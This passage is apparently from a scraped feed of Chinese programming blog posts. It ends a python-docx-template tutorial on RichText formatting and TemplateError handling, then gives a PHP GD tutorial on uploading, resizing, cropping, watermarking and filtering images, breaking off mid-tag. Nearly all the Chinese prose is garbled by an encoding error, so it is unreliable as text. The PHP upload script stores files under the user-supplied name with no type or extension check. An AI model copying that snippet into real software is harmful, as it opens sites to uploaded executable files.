å…¥æ–‡æœ¬ï¼Œé€šè¿‡å¤šæ¬¡è°ƒç”¨addæ–¹æ³•å¯å‘å…¶è¿½åŠ ä¸åŒæ ¼å¼çš„æ–‡æœ¬ç‰‡æ®µã€‚æœ€åï¼Œå°†è¯¥å¯¹è±¡æ•´ä½“èµ‹ç»™æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­çš„å˜é‡ã€‚åœ¨Wordæ¨¡æ¿ä¸­ï¼Œåªéœ€ä½¿ç”¨<code>{{ rich_text_var }}</code>å¼•ç”¨è¯¥å˜é‡ï¼Œå³å¯æ¸²æŸ“æˆåŒ…å«å¤šç§æ ¼å¼çš„è¿ç»­æ®µè½ã€‚</p>\n<p><img alt=\"\" src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/img2.png\" /></p>\n<p>addæ–¹æ³•æ˜¯æ„å»ºRichTextå¯¹è±¡çš„æ ¸å¿ƒï¼Œå…¶æ‰€æœ‰å‚æ•°å‡ç”¨äºæ§åˆ¶å½“å‰æ“ä½œæ‰€æ·»åŠ æ–‡æœ¬çš„æ ¼å¼ï¼š</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">å‚æ•°</th>\n<th style=\"text-align: left;\">ç±»å‹</th>\n<th style=\"text-align: left;\">é»˜è®¤å€¼</th>\n<th style=\"text-align: left;\">è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">text</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">æ— </td>\n<td style=\"text-align: left;\">å”¯ä¸€å¿…éœ€å‚æ•°ï¼Œè¦è¿½åŠ çš„æ–‡æœ¬å†…å®¹</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">style</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">åº”ç”¨æ®µè½æ ·å¼ï¼Œè¿™ä¼šå½±å“æ•´ä¸ªç”±RichTextå¯¹è±¡ç”Ÿæˆçš„æ®µè½çš„æ ·å¼</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">color</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">å­—ä½“é¢œè‰²æ”¯æŒåå…­è¿›åˆ¶ï¼ˆå¦‚#FF0000ï¼‰æˆ–Wordé¢„è®¾é¢œè‰²åï¼ˆå¦‚redï¼‰</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">highlight</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">æ–‡æœ¬èƒŒæ™¯é«˜äº®è‰²ï¼Œå–å€¼åŒcolorå‚æ•°</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">size</td>\n<td style=\"text-align: left;\">int</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">å­—ä½“å¤§å°</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">subscript</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶æ–‡æœ¬æ˜¾ç¤ºä¸ºä¸‹æ ‡ï¼Œä¸superscriptäº’æ–¥</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">superscript</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶æ–‡æœ¬æ˜¾ç¤ºä¸ºä¸Šæ ‡ï¼Œä¸subscriptäº’æ–¥</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">bold</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">False</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶ï¼Œæ–‡æœ¬åŠ ç²—</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">italic</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">False</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶ï¼Œæ–‡æœ¬å€¾æ–œ</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">underline</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">False</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶ï¼Œæ–‡æœ¬æ·»åŠ ä¸‹åˆ’çº¿</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">strike</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">False</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶ï¼Œæ–‡æœ¬æ·»åŠ åˆ é™¤çº¿</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">font</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">å­—ä½“åç§°</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">url_id</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">æ·»åŠ è¶…é“¾æ¥ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªé“¾æ¥IDï¼Œè¯¥IDä¸€èˆ¬é€šè¿‡æ–‡æ¡£å¯¹è±¡çš„build_url_id()æ–¹æ³•ç”Ÿæˆ</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">rtl</td>\n<td style=\"text-align: left;\">bool</td>\n<td style=\"text-align: left;\">False</td>\n<td style=\"text-align: left;\">è®¾ä¸ºTrueæ—¶ï¼Œæ–‡æœ¬ä»å³å‘å·¦æ’åˆ—ï¼Œä»…å¯¹é˜¿æ‹‰ä¼¯è¯­ã€å¸Œä¼¯æ¥è¯­ç­‰æœ‰æ•ˆ</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">lang</td>\n<td style=\"text-align: left;\">str</td>\n<td style=\"text-align: left;\">None</td>\n<td style=\"text-align: left;\">è®¾ç½®æ–‡æœ¬çš„è¯­è¨€ï¼Œç”¨äºæ‹¼å†™æ£€æŸ¥å’Œæ–­å­—</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>é‡è¦æç¤ºğŸš©ï¼šstyleï¼ˆæ®µè½æ ·å¼ï¼‰å‚æ•°æ¯”è¾ƒç‰¹æ®Šã€‚å®ƒé€šå¸¸åªåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨addæ–¹æ³•æ—¶æœ‰æ•ˆï¼Œåç»­è°ƒç”¨ä¸­å†è®¾ç½®styleé€šå¸¸ä¼šè¢«å¿½ç•¥ã€‚</p>\n</blockquote>\n<p>ä»¥ä¸‹æ˜¯ä¸€æ®µä½¿ç”¨ç¤ºä¾‹ä»£ç ï¼ŒæŒ‰é¡ºåºä»‹ç»<code>RichText.add()</code>æ–¹æ³•çš„å„ä¸ªå‚æ•°ï¼š</p>\n<pre><code class=\"language-python\">from docxtpl import DocxTemplate, RichText\nimport os\n# 1. åˆ›å»ºæ¨¡æ¿å¯¹è±¡å¹¶åˆå§‹åŒ–RichText\ndoc = DocxTemplate(\"template.docx\")\nrt = RichText()\n\n# 2. æ·»åŠ åŸºç¡€æ–‡æœ¬ï¼ˆå¿…éœ€å‚æ•°ï¼‰\nrt.add(\"è¿™æ˜¯æ™®é€šæ–‡æœ¬\")\n\n# 3. è®¾ç½®æ®µè½æ ·å¼ï¼ˆå½±å“æ•´ä¸ªæ®µè½ï¼‰\nrt.add(\"\\næ ‡é¢˜æ–‡æœ¬\", style=\"Heading1\")\n\n# 4. è®¾ç½®å­—ä½“é¢œè‰²\nrt.add(\" çº¢è‰²æ–‡å­—\", color=\"#FF0000\")\nrt.add(\" è“è‰²æ–‡å­—\", color=\"blue\")\n\n# 5. è®¾ç½®èƒŒæ™¯é«˜äº®\nrt.add(\" é»„åº•æ–‡å­—\", highlight=\"yellow\")\n\n# 6. è®¾ç½®å­—ä½“å¤§å°ï¼ˆå•ä½ï¼šç£…ï¼‰\nrt.add(\" å°å·å­—\", size=8)\nrt.add(\" å¤§å·å­—\", size=20)\n\n# 7. ä¸Šä¸‹æ ‡è®¾ç½®\nrt.add(\" æ­£å¸¸æ–‡å­—\")\nrt.add(\" ä¸Šæ ‡\", superscript=True)\nrt.add(\" ä¸‹æ ‡\", subscript=True)\n\n# 8. å­—ä½“æ ·å¼\nrt.add(\" åŠ ç²—\", bold=True)\nrt.add(\" å€¾æ–œ\", italic=True)\nrt.add(\" ä¸‹åˆ’çº¿\", underline=True)\nrt.add(\" åˆ é™¤çº¿\", strike=True)\n\n# 9. å­—ä½“è®¾ç½®\nrt.add(\" å®‹ä½“\", font=\"eastAsia:SimSun\")\nrt.add(\" å¾®è½¯é›…é»‘\", font=\"eastAsia:Microsoft YaHei\")\n\n# 10. è¶…é“¾æ¥ï¼ˆéœ€è¦å…ˆç”Ÿæˆé“¾æ¥IDï¼‰\nurl_id = doc.build_url_id(\"https://www.example.com\")\nrt.add(\" è¶…é“¾æ¥æ–‡æœ¬\", url_id=url_id)\n\n# 11. æ–‡å­—æ–¹å‘\nrt.add(\" æ­£å¸¸æ–¹å‘\")\nrt.add(\" ä»å³å‘å·¦æ–‡å­—\", rtl=True) # ä¸­æ–‡è®¾ç½®æ— æ•ˆæœ\n\n# 12. è¯­è¨€è®¾ç½®\nrt.add(\" English text\", lang=\"en-US\")\nrt.add(\" ä¸­æ–‡æ–‡æœ¬\", lang=\"zh-CN\")\n\ncontext = {\n    'rich_text_var': rt\n}\ndoc.render(context)\nos.makedirs('output',exist_ok=True)\ndoc.save(\"output/generated_document.docx\")\n</code></pre>\n<p>åœ¨æ¨¡æ¿ä¸­åªéœ€ç®€å•å¼•ç”¨ï¼š</p>\n<pre><code>{{ rich_text_var }}\n</code></pre>\n<h2 id=\"110-é”™è¯¯ç®¡ç†\">1.10 é”™è¯¯ç®¡ç†</h2>\n<p>TemplateErrorç±»æ˜¯Jinja2æ¨¡æ¿å¼•æ“ä¸­æ‰€æœ‰æ¨¡æ¿ç›¸å…³å¼‚å¸¸çš„åŸºç±»ï¼Œåœ¨python-docx-templateä¸­ä¸“é—¨ç”¨äºæ•è·æ¨¡æ¿æ¸²æŸ“è¿‡ç¨‹ä¸­å‡ºç°çš„å„ç±»é”™è¯¯ã€‚å½“ä½¿ç”¨<code>tpl.render()</code>æ¸²æŸ“ Word æ¨¡æ¿æ—¶ï¼Œä»¥ä¸‹æƒ…å†µä¼šæŠ›å‡º<code>TemplateError</code>å¼‚å¸¸ï¼š</p>\n<ul>\n<li>æ¨¡æ¿ä¸­å¼•ç”¨äº†æœªä¼ å…¥çš„å˜é‡ï¼ˆå¦‚æ¨¡æ¿å†™äº†<code>{{ name }}</code>ï¼Œä½†<code>render</code>åªä¼ äº†<code>test_variable</code>ï¼‰ï¼›</li>\n<li>æ¨¡æ¿ä¸­çš„Jinja2è¯­æ³•é”™è¯¯ï¼ˆå¦‚ç¼ºå°‘é—­åˆçš„<code>{% endif %}</code>ã€å˜é‡å¼•ç”¨æ ¼å¼é”™è¯¯ï¼‰ï¼›</li>\n<li>æ¨¡æ¿ä¸­ä½¿ç”¨äº†ä¸å­˜åœ¨çš„è¿‡æ»¤å™¨/å‡½æ•°ï¼ˆå¦‚<code>{{ test_variable | xxx }}</code>ï¼Œ<code>xxx</code>ä¸æ˜¯ Jinja2 å†…ç½®è¿‡æ»¤å™¨ï¼‰ã€‚</li>\n</ul>\n<p>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•æµ‹æ•è·Wordæ¨¡æ¿æ¸²æŸ“æ—¶çš„TemplateErrorå¼‚å¸¸ï¼Œå¹¶æ‰“å°è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼š</p>\n<pre><code class=\"language-python\">from docxtpl import DocxTemplate\nfrom jinja2.exceptions import TemplateError\n\nprint(\"=\" * 50)\nprint(\"æ­£åœ¨ç”Ÿæˆæµ‹è¯•ç”¨çš„æ¨¡æ¿é”™è¯¯\")\nprint(\".\" * 50)\n\ntry:\n    tpl = DocxTemplate(\"templates/template_error_tpl.docx\")\n    # å¦‚æœæ¨¡æ¿ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯æˆ–å˜é‡ç¼ºå¤±ï¼Œä¼šè§¦å‘TemplateErrorå¼‚å¸¸\n    tpl.render({\"test_variable\": \"æµ‹è¯•å˜é‡å€¼\"})\n# æ•è·æ¨¡æ¿æ¸²æŸ“è¿‡ç¨‹ä¸­å‡ºç°çš„æ‰€æœ‰TemplateErrorå¼‚å¸¸\nexcept TemplateError as the_error:\n    # æ‰“å°é”™è¯¯çš„åŸºæœ¬æè¿°ä¿¡æ¯\n    print(f\"æ¨¡æ¿æ¸²æŸ“é”™è¯¯ï¼š{str(the_error)}\")\n    # æ£€æŸ¥å¼‚å¸¸å¯¹è±¡æ˜¯å¦åŒ…å«docx_contextå±æ€§\n    if hasattr(the_error, \"docx_context\"):\n        # æ‰“å°ä¸Šä¸‹æ–‡ä¿¡æ¯çš„æ ‡é¢˜\n        print(\"é”™è¯¯ä¸Šä¸‹æ–‡è¯¦æƒ…ï¼š\")\n        # éå†å¹¶æ‰“å°é”™è¯¯ä¸Šä¸‹æ–‡çš„æ¯ä¸€è¡Œå†…å®¹\n        for line in the_error.docx_context:\n            print(line)\n# ç¡®ä¿tplå˜é‡å­˜åœ¨æ—¶å†æ‰§è¡Œä¿å­˜æ“ä½œ\nif 'tpl' in locals():\n    # å°†æ¸²æŸ“åçš„æ–‡æ¡£ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„\n    tpl.save(\"output/template_error.docx\")\n    print(f\"æ–‡æ¡£å·²ä¿å­˜è‡³ï¼šoutput/template_error.docx\")\nprint(\".\" * 50)\nprint(\" æ¨¡æ¿é”™è¯¯æµ‹è¯•å®Œæˆ \")\nprint(\"=\" * 50)\n</code></pre>\n<h1 id=\"2-å‚è€ƒ\">2 å‚è€ƒ</h1>\n<ul>\n<li><a href=\"https://www.cnblogs.com/luohenyueji/p/19503461\" target=\"_blank\">python-docx-templateæ¨¡æ¿åŒ–Wordæ–‡æ¡£ç”ŸæˆæŒ‡åŒ—</a></li>\n<li><a href=\"https://github.com/elapouya/python-docx-template\" rel=\"noopener nofollow\" target=\"_blank\">python-docx-template</a></li>\n<li><a href=\"https://docxtpl.readthedocs.io/\" rel=\"noopener nofollow\" target=\"_blank\">python-docx-template doc</a></li>\n</ul>\n\n\n</div>\n<div id=\"MySignature\">\n    <p>æœ¬æ–‡æ¥è‡ªåšå®¢å›­ï¼Œä½œè€…ï¼š<a href=\"https://www.cnblogs.com/luohenyueji/\" target=\"_blank\">è½ç—•çš„å¯’å‡</a>ï¼Œè½¬è½½è¯·æ³¨æ˜åŸæ–‡é“¾æ¥ï¼š<a href=\"https://www.cnblogs.com/luohenyueji/p/19556736\" target=\"_blank\">https://www.cnblogs.com/luohenyueji/p/19556736</a></p>\n\n<div style=\"text-align: center;\">\n    <img src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/wechat/content/%E5%8A%A0%E6%B2%B9%E9%B8%AD.gif\" />\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-31 09:17</span>&nbsp;\n<a href=\"https://www.cnblogs.com/luohenyueji\">è½ç—•çš„å¯’å‡</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">7</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½",
      "link": "https://www.cnblogs.com/catchadmin/p/19556570",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19556570\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-31 08:40\">\n    <span>ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"ç”¨-php-ç©è½¬å›¾ç‰‡ç¼©æ”¾è£å‰ªæ°´å°æ»¤é•œä¸€ç½‘æ‰“å°½\">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</h1>\n<p>æåˆ° PHP å’Œå›¾åƒï¼Œä½ ä¼šæƒ³åˆ°ä»€ä¹ˆï¼Ÿå¤§æ¦‚æ˜¯ä¸Šä¼ ä¸€å¼ å›¾ç‰‡åˆ°ç½‘ç«™ï¼Œç„¶åæ”¶å·¥ã€‚ä½† PHP å¯ä¸åªæ˜¯ä¸ªä¸Šä¼ å·¥å…·â€”â€”å®ƒåœ¨å›¾åƒå¤„ç†æ–¹é¢è—ç€ä¸å°‘æœ¬äº‹ã€‚</p>\n<p>å›¾ç‰‡å¤ªå¤§æ”¾ä¸ä¸‹ç½‘é¡µï¼Ÿéœ€è¦è£æ‰èƒŒæ™¯é‡Œé‚£ä¸ªä¹±å…¥çš„è·¯äººï¼ŸPHP éƒ½èƒ½æå®šã€‚æ— è®ºæ˜¯ç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ï¼Œè¿˜æ˜¯åƒ Instagram é‚£æ ·åŠ æ»¤é•œï¼ŒPHP éƒ½èƒ½èƒœä»»ã€‚</p>\n<p>è¿™ç¯‡æ–‡ç« ä¼šå¸¦ä½ äº†è§£ PHP å›¾åƒå¤„ç†çš„æ›´å¤šç©æ³•ã€‚æˆ‘ä»¬ä¼šæ·±å…¥ GD åº“ï¼Œé¡ºä¾¿èŠèŠ Imagickã€‚</p>\n<h2 id=\"gd-å’Œ-imagickä¸¤å¤§å›¾åƒå¤„ç†åº“\">GD å’Œ Imagickï¼šä¸¤å¤§å›¾åƒå¤„ç†åº“</h2>\n<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œå…ˆä»‹ç»ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·ï¼šGD åº“å’Œ Imagickã€‚</p>\n<h3 id=\"gd-åº“ç¨³å®šå¯é çš„è€ä¼™è®¡\">GD åº“ï¼šç¨³å®šå¯é çš„è€ä¼™è®¡</h3>\n<p>PHP å†…ç½®çš„ GD åº“æ˜¯ä¸ªç»å…¸é€‰æ‹©ï¼Œé€‚åˆå¤„ç†åŸºç¡€çš„å›¾åƒæ“ä½œï¼šç¼©æ”¾ã€è£å‰ªã€æ·»åŠ æ–‡å­—ã€‚å®ƒé»˜è®¤å°±åœ¨ PHP é‡Œï¼Œä¸ç”¨é¢å¤–å®‰è£…ã€‚è™½ç„¶ä¸æ˜¯æœ€ç‚«çš„ï¼Œä½†å¤Ÿç”¨ã€ç¨³å®šã€‚</p>\n<h3 id=\"imagickåŠŸèƒ½æ›´å¼ºçš„æ–°é€‰æ‹©\">Imagickï¼šåŠŸèƒ½æ›´å¼ºçš„æ–°é€‰æ‹©</h3>\n<p>Imagick æ˜¯å¦ä¸€ä¸ªå›¾åƒå¤„ç†åº“ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚å®ƒæ“…é•¿å¤„ç†çŸ¢é‡å›¾ã€åº”ç”¨ç‰¹æ•ˆã€æ”¯æŒæ›´å¤šæ ¼å¼ã€‚å¦‚æœä½ éœ€è¦åšå¤æ‚çš„å›¾åƒå¤„ç†ï¼ŒImagick æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ä¸è¿‡æœ¬æ–‡ä¸»è¦ç”¨ GD åº“æ¥æ¼”ç¤ºã€‚</p>\n<h2 id=\"åŸºç¡€å›¾åƒä¸Šä¼ \">åŸºç¡€ï¼šå›¾åƒä¸Šä¼ </h2>\n<p>åœ¨å¤„ç†å›¾åƒä¹‹å‰ï¼Œå¾—å…ˆæŠŠå®ƒä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºç¡€çš„ä¸Šä¼ è„šæœ¬ï¼š</p>\n<pre><code class=\"language-php\">if ($_SERVER['REQUEST_METHOD'] == 'POST' &amp;&amp; isset($_FILES['image'])) {\n    $image = $_FILES['image'];\n    $uploadDir = 'uploads/';\n    $uploadFile = $uploadDir . basename($image['name']);\n    \n    if (move_uploaded_file($image['tmp_name'], $uploadFile)) {\n        echo 'Image uploaded successfully!';\n    } else {\n        echo 'Failed to upload image.';\n    }\n}\n</code></pre>\n<p>è¿™æ®µä»£ç æŠŠä¸Šä¼ çš„å›¾ç‰‡ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹å¤„ç†äº†ã€‚</p>\n<h2 id=\"ä½¿ç”¨-gd-åº“å¤„ç†å›¾åƒ\">ä½¿ç”¨ GD åº“å¤„ç†å›¾åƒ</h2>\n<p>ä¸Šä¼ æå®šäº†ï¼Œç°åœ¨è¿›å…¥æ­£é¢˜â€”â€”å›¾åƒå¤„ç†ã€‚</p>\n<h3 id=\"ç¼©æ”¾å›¾åƒ\">ç¼©æ”¾å›¾åƒ</h3>\n<p>å›¾ç‰‡å¤ªå¤§ä¼šæ‹–æ…¢é¡µé¢åŠ è½½é€Ÿåº¦ã€‚ç”¨ GD åº“å¯ä»¥è½»æ¾ç¼©æ”¾ï¼š</p>\n<pre><code class=\"language-php\">function resizeImage($source, $target, $width, $height) {\n    list($originalWidth, $originalHeight) = getimagesize($source);\n    $image = imagecreatefromjpeg($source);\n    \n    $newImage = imagecreatetruecolor($width, $height);\n    imagecopyresized($newImage, $image, 0, 0, 0, 0, $width, $height, $originalWidth, $originalHeight);\n    \n    imagejpeg($newImage, $target);\n    imagedestroy($image);\n    imagedestroy($newImage);\n}\n</code></pre>\n<p>è¿™ä¸ªå‡½æ•°æŠŠå›¾åƒç¼©æ”¾åˆ°æŒ‡å®šçš„å®½é«˜ï¼Œé€‚åˆåœ¨å±•ç¤ºå‰è°ƒæ•´å›¾ç‰‡å°ºå¯¸ã€‚</p>\n<h3 id=\"è£å‰ªå›¾åƒ\">è£å‰ªå›¾åƒ</h3>\n<p>éœ€è¦è£æ‰å›¾ç‰‡çš„æŸä¸ªåŒºåŸŸï¼Ÿç”¨ <code>imagecrop()</code> å‡½æ•°ï¼š</p>\n<pre><code class=\"language-php\">function cropImage($source, $target, $x, $y, $width, $height) {\n    list($originalWidth, $originalHeight) = getimagesize($source);\n    $image = imagecreatefromjpeg($source);\n    \n    $croppedImage = imagecrop($image, ['x' =&gt; $x, 'y' =&gt; $y, 'width' =&gt; $width, 'height' =&gt; $height]);\n    \n    if ($croppedImage !== FALSE) {\n        imagejpeg($croppedImage, $target);\n        imagedestroy($croppedImage);\n    }\n    imagedestroy($image);\n}\n</code></pre>\n<p>æŒ‡å®šè£å‰ªåŒºåŸŸçš„åæ ‡å’Œå°ºå¯¸ï¼ŒPHP ä¼šå¸®ä½ å®Œæˆå‰©ä¸‹çš„å·¥ä½œã€‚</p>\n<h3 id=\"æ·»åŠ æ°´å°\">æ·»åŠ æ°´å°</h3>\n<p>å¦‚æœä½ è¿è¥ä¸€ä¸ªå…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡çš„ç½‘ç«™ï¼Œç»™å›¾ç‰‡åŠ æ°´å°å¯ä»¥é˜²æ­¢ç›—ç”¨ã€‚ä¸‹é¢æ˜¯æ·»åŠ æ°´å°çš„æ–¹æ³•ï¼š</p>\n<pre><code class=\"language-php\">function addWatermark($imagePath, $watermarkPath, $targetPath) {\n    $image = imagecreatefromjpeg($imagePath);\n    $watermark = imagecreatefrompng($watermarkPath);\n    \n    $imageWidth = imagesx($image);\n    $imageHeight = imagesy($image);\n    $watermarkWidth = imagesx($watermark);\n    $watermarkHeight = imagesy($watermark);\n    \n    // æ°´å°æ”¾åœ¨å³ä¸‹è§’\n    $destX = $imageWidth - $watermarkWidth - 10;\n    $destY = $imageHeight - $watermarkHeight - 10;\n    \n    imagecopy($image, $watermark, $destX, $destY, 0, 0, $watermarkWidth, $watermarkHeight);\n    \n    imagejpeg($image, $targetPath);\n    imagedestroy($image);\n    imagedestroy($watermark);\n}\n</code></pre>\n<p>è¿™ä¸ªå‡½æ•°æŠŠ PNG æ ¼å¼çš„æ°´å°å åŠ åˆ°å›¾ç‰‡å³ä¸‹è§’ã€‚</p>\n<h2 id=\"è¿›é˜¶æ»¤é•œå’Œç¼©ç•¥å›¾\">è¿›é˜¶ï¼šæ»¤é•œå’Œç¼©ç•¥å›¾</h2>\n<p>æŒæ¡äº†åŸºç¡€æ“ä½œï¼Œæ¥çœ‹çœ‹æ›´é«˜çº§çš„ç©æ³•ã€‚</p>\n<h3 id=\"åº”ç”¨æ»¤é•œ\">åº”ç”¨æ»¤é•œ</h3>\n<p>GD åº“æ”¯æŒç»™å›¾åƒæ·»åŠ æ»¤é•œã€‚æ¯”å¦‚æŠŠå›¾ç‰‡è½¬æˆç°åº¦ï¼š</p>\n<pre><code class=\"language-php\">function applyGrayscale($imagePath, $targetPath) {\n    $image = imagecreatefromjpeg($imagePath);\n    \n    imagefilter($image, IMG_FILTER_GRAYSCALE);\n    \n    imagejpeg($image, $targetPath);\n    imagedestroy($image);\n}\n</code></pre>\n<p>é™¤äº†ç°åº¦ï¼Œè¿˜å¯ä»¥è°ƒæ•´äº®åº¦ã€å¯¹æ¯”åº¦ï¼Œç”šè‡³åšåƒç´ åŒ–æ•ˆæœã€‚</p>\n<h3 id=\"ç”Ÿæˆç¼©ç•¥å›¾\">ç”Ÿæˆç¼©ç•¥å›¾</h3>\n<p>åœ¨å›¾ç‰‡åº“æˆ–å•†å“åˆ—è¡¨ä¸­ï¼Œç¼©ç•¥å›¾æ˜¯å¿…ä¸å¯å°‘çš„ã€‚ä¸‹é¢æ˜¯ç”Ÿæˆç¼©ç•¥å›¾çš„å‡½æ•°ï¼š</p>\n<pre><code class=\"language-php\">function createThumbnail($source, $target, $thumbWidth) {\n    list($originalWidth, $originalHeight) = getimagesize($source);\n    $thumbHeight = ($thumbWidth / $originalWidth) * $originalHeight;\n    \n    $image = imagecreatefromjpeg($source);\n    $thumb = imagecreatetruecolor($thumbWidth, $thumbHeight);\n    \n    imagecopyresized($thumb, $image, 0, 0, 0, 0, $thumbWidth, $thumbHeight, $originalWidth, $originalHeight);\n    \n    imagejpeg($thumb, $target);\n    imagedestroy($image);\n    imagedestroy($thumb);\n}\n</code></pre>\n<p>è¿™ä¸ªå‡½æ•°æŒ‰æŒ‡å®šå®½åº¦ç”Ÿæˆç¼©ç•¥å›¾ï¼ŒåŒæ—¶ä¿æŒåŸå›¾çš„å®½é«˜æ¯”ã€‚</p>\n<h2 id=\"å¸¸è§é—®é¢˜æ’æŸ¥\">å¸¸è§é—®é¢˜æ’æŸ¥</h2>\n<p>å›¾åƒå¤„ç†æœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œè¿™é‡Œåˆ—å‡ºå‡ ä¸ªå¸¸è§çš„ã€‚</p>\n<h3 id=\"å›¾åƒæŸå\">å›¾åƒæŸå</h3>\n<p>å¦‚æœ PHP æ— æ³•æ­£ç¡®å¤„ç†å›¾åƒæ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŸåã€‚å¤„ç†å‰å…ˆç”¨ <code>getimagesize()</code> éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆå›¾åƒï¼ŒåŒæ—¶ç¡®è®¤æ–‡ä»¶æ ¼å¼ï¼ˆJPEGã€PNGã€GIFï¼‰ã€‚</p>\n<h3 id=\"å†…å­˜ä¸è¶³\">å†…å­˜ä¸è¶³</h3>\n<p>å¤„ç†å¤§å›¾ç‰‡æ—¶å¯èƒ½ä¼šé‡åˆ°å†…å­˜é™åˆ¶ã€‚å¯ä»¥åœ¨ <code>php.ini</code> ä¸­è°ƒæ•´ <code>memory_limit</code>ã€‚å¦‚æœæ˜¯å…±äº«ä¸»æœºï¼Œå¯èƒ½éœ€è¦è”ç³»æœåŠ¡å•†æå‡é…é¢ã€‚</p>\n<h2 id=\"æ€»ç»“\">æ€»ç»“</h2>\n<p>PHP çš„å›¾åƒå¤„ç†èƒ½åŠ›è¿œä¸æ­¢ä¸Šä¼ é‚£ä¹ˆç®€å•ã€‚å€ŸåŠ© GD å’Œ Imagickï¼Œä½ å¯ä»¥å®Œæˆç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ã€åº”ç”¨æ»¤é•œç­‰æ“ä½œã€‚æ— è®ºæ˜¯æ­å»ºå›¾ç‰‡åº“ã€å¤„ç†ç”¨æˆ·ä¸Šä¼ çš„å†…å®¹ï¼Œè¿˜æ˜¯ä¼˜åŒ–ç½‘ç«™å›¾ç‰‡ï¼Œè¿™äº›æŠ€èƒ½éƒ½èƒ½æ´¾ä¸Šç”¨åœºã€‚<br />\n<a href=\"https://catchadmin.com/post/2026-01/openclaw-installed\" rel=\"noopener 